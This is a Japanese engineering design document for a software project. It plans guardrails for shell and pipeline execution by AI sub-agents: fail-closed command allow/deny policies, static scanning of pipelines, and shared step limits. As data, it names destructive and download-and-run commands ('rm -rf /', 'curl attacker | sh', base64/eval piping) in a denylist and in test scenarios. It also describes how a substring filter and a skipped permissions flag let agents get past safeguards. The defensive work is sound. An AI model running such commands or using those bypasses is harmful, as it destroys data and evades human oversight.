# SA-02: ADF/シェル実行のガードレール — 「検証済み ≠ 安全」の解消

> 優先度: **P0** / 規模: M〜L / 依存: なし / 関連: MO-02(ゲート)、AA-01(runtime)

## 背景と課題

不変条件「検証済み契約のみ実行」は**スキーマ検証のみ**を意味しており、危険な内容の走査が無い。加えてサブエージェントに無条件でシェルが渡っている。

- **ADF 検証は Ajv スキーマのみ**(`pipeline-contract.ts:102-112`)。シェルコマンド allow/deny も egress チェックも危険 op 走査も無い。`StepHook` は `type:'command'` の自由文字列 `cmd` と `type:'http'` の任意 `url`/`body` を許す(`:11-25`)。※現状 hooks の executor 配線は見当たらず**潜在リスク**だが、実装された瞬間に無防備になる。
- **サブエージェントに無条件 Bash**(HIGH): `claude-agent-governance.ts:88-91` は `if (toolName === 'Bash') { audit; return allow; }` — コマンド内容を一切検査しない。ファイル書き込みは tier-guard 下だが、**Bash が完全なエスケープハッチ**で write-scope tiering を無意味化する。
- **危険 op フィルタが実質無効**: 唯一のフィルタは `acp-mediator.ts:258-263` の部分文字列ブロックリスト(`['rm -rf','format','drop table',...]`)を**ツール呼び出しのタイトル**に対して照合するもので、難読化・別フラグ(`rm -r -f`)・base64 で自明に回避でき、しかも**マッチしないものは default で承認**(`:271-272`、fail-open)。
- `--dangerously-skip-permissions` が spawn する Claude CLI に渡っている(`shell-claude-cli-backend.ts:384,407`、`agent-adapter.ts:680`、`agy-cli-backend.ts:330,378`)。Claude 側のネイティブ許可プロンプトが無効化され、Kyberion 自身の(回避可能な)ゲートだけが防壁。
- V-3-15(無限ループ ADF): **実行時バックストップは有る**(`system-pipeline-helpers.ts:1295-1313` の MAX_STEPS 1000 + 60s、`while` は max_iterations 100)が **契約時の静的検知は無く**、しかもこのバックストップは system-actuator 内だけにあり、他のパイプライン実行系は各自で再実装が必要。

## ゴール(受入条件)

1. シェルコマンドに **allowlist/denylist ポリシー**(`knowledge/product/governance/` に配置)が入り、実行前に評価される。denylist マッチ・allowlist 非該当は**既定でブロック(fail-closed)**、承認経由でのみ実行。部分文字列でなく、コマンド解析(実行ファイル名 + 危険引数パターン)ベース。
2. サブエージェントの Bash が無条件許可でなくなり、同ポリシーを通る(read-only 系コマンドは自動許可、変更系・ネットワーク系は承認/スコープ確認)。
3. ADF 検証に**危険パターンの静的走査**(自由文字列 cmd の denylist 該当、http 先の egress ポリシー該当、ステップ数/ループ上限の欠落)が追加され、preflight で警告/ブロックする。
4. 実行時ステップ/ループ上限が system-actuator 外の実行系でも共有される(共通ガード関数化)。
5. `acp-mediator` の fail-open な default 承認が fail-closed(未分類は承認要求へ)に変わる。

## 実装状況 (2026-07-05)

- **完了(Task 1)**: `libs/core/shell-command-policy.ts` + `knowledge/product/governance/shell-command-policy.json`。コマンド解析(env プレフィクス除去 + 実行ファイル名 + 引数、クォート対応トークナイザ)ベースで denylist → allowlist → **未該当は require_approval(fail-closed)**。ポリシーファイル欠落時も fail-closed。unit test あり。
- **完了(Task 2)**: `claude-agent-governance.ts` の Bash 無条件 allow を撤廃し、非 allow verdict は理由付き deny。`acp-mediator.ts` も同ポリシー評価 + 未該当 default deny(fail-closed)。※ require_approval → approval-gate 経由の対話的承認ルーティングは SA-05/UX-04 の承認経路統合時に接続(現状は安全側の deny)。
- **完了(Task 3)**: `libs/core/adf-guardrails.ts`(`validatePipelineGuardrails`)が cmd hook のポリシー走査・http 先の egress 走査・step/loop 上限を検査。`readValidatedPipelineAdf`(run_pipeline の唯一のロード経路)と `adf-repair-agent`(validateAndRepairAdf)に配線済みで、error findings はロード時に throw。unit test あり。
- **完了(Task 4, 2026-07-05)**: `libs/core/execution-bounds.ts` を新設し、system-actuator の MAX_STEPS / TIMEOUT / max_iterations バックストップを `assertExecutionBounds` / `withinLoopBounds` として抽出(`[SAFETY_LIMIT]` メッセージ互換)。system-actuator を移行し既存テスト 96 件緑。他の実行系からは `@agent/core` 経由で利用可能。
- **完了(Task 5, 2026-07-05)**: `SECURITY.md` に「Shell & ADF Execution Guardrails」節を追加。危険シナリオの再現は shell-command-policy / adf-guardrails の unit test が担保。
- **備考**: 現状は全経路 enforce(warn 観測モードは経ずに deny/require_approval が既定)。サンドボックス化(コンテナ/eBPF)は将来計画。

## 実装タスク

### Task 1: シェルコマンドポリシーエンジン — `claude-sonnet-4`

1. `libs/core/shell-command-policy.ts` を新設: コマンド文字列を解析(実行ファイル名抽出 + 引数)し、`knowledge/product/governance/shell-command-policy.json`(allowlist: `ls,cat,grep,git status,...` / denylist: `rm -rf,curl|sh,dd,mkfs,...` / require_approval: ネットワーク・パッケージインストール系)に照合。返り値 `{ verdict: allow|deny|require_approval, matched_rule, reason }`。**未該当は既定 require_approval(fail-closed)**。ポリシーファイル欠落時も fail-closed(SA-05 の fail-open 解消方針と統一)。
2. base64/難読化の単純検知(`base64 -d`、`eval`、パイプ経由の `sh`/`bash`)を denylist に含める。完全な難読化耐性は目指さない(それは不可能)が、素朴な回避は塞ぐ。
3. unit test: allow/deny/require_approval/未該当/ポリシー欠落。

### Task 2: サブエージェント Bash の統制 — `claude-sonnet-4`

1. `claude-agent-governance.ts:88-91` の無条件 allow を Task 1 のポリシー評価に置換。allow → 実行、require_approval → approval-gate(SA-05/UX-04 の承認経路)、deny → 拒否 + 監査。
2. `acp-mediator.ts:258-273` のタイトル部分文字列フィルタを Task 1 ポリシーに置換し、**default を承認要求(fail-closed)** に変更。
3. `--dangerously-skip-permissions` の使用箇所に「Kyberion 側ゲートが唯一の防壁である」旨のコメントと、ポリシー通過を前提とする明示的なフローを付ける(フラグ自体は CLI 連携上必要な場合があるため、除去でなくゲート前置を確実にする)。
4. test: 危険コマンドが sub-agent 経由で拒否/承認要求されること。

### Task 3: ADF 静的ガードレール走査 — `claude-sonnet-4`

1. `libs/core/adf-guardrail.ts` を新設: 検証済み ADF に対し (a) `command` hook / shell op の cmd を Task 1 ポリシーで走査、(b) `http`/fetch 先を SA-04 の egress ポリシーで走査、(c) ループ/ステップ上限の欠落や過大値を検出。結果を `{ findings: [{severity, step, reason}] }` で返す。
2. `validateAndRepairAdf`(IP-07 でテスト追加済みの経路)と pipeline 実行前(`run_pipeline`)にガードレール走査を挿入。high severity はブロック(承認で override)、medium は警告 + trace 記録。
3. V-3-15: ステップ/ループ上限が宣言されていない ADF に既定上限を注入 or 警告する静的チェックを含める。
4. test: 危険 cmd 入り ADF / egress 違反 ADF / 上限欠落 ADF。

### Task 4: 実行時ガードの共通化 — `claude-sonnet-4`

1. system-actuator の MAX_STEPS/TIMEOUT/max_iterations ロジック(`system-pipeline-helpers.ts:1290-1313`)を `libs/core/execution-bounds.ts` に抽出し、他のパイプライン実行系(orchestrator 等)からも使えるようにする。
2. 既存 system-actuator の挙動が不変であることをテストで固定してから抽出。

### Task 5: 検証 — `claude-haiku`

- 代表的な危険シナリオ(`rm -rf /` を含む ADF、`curl attacker | sh` を sub-agent に依頼、http egress を任意ホストへ)が、それぞれブロック/承認要求されることを再現テストで確認して報告。`SECURITY.md` にシェルポリシーとガードレールの節を追記。

## リスクと注意

- fail-closed 化は**正常な運用を止め得る**。allowlist は実運用で頻用されるコマンドを事前に十分カバーし、require_approval が多発しないよう調整する。移行期は `KYBERION_SHELL_POLICY=warn|enforce`(既定 warn で観測 → enforce)の段階導入を許可する(ただし enforce 到達を本 IP の完了条件とする)。
- 難読化耐性を過大に主張しない。ガードレールは「素朴〜中程度の危険を高確率で捕捉する多層防御の一層」であり、完全な sandbox(コンテナ/eBPF)ではない。将来のサンドボックス化は別計画として本文書に「次の一手」で記す。
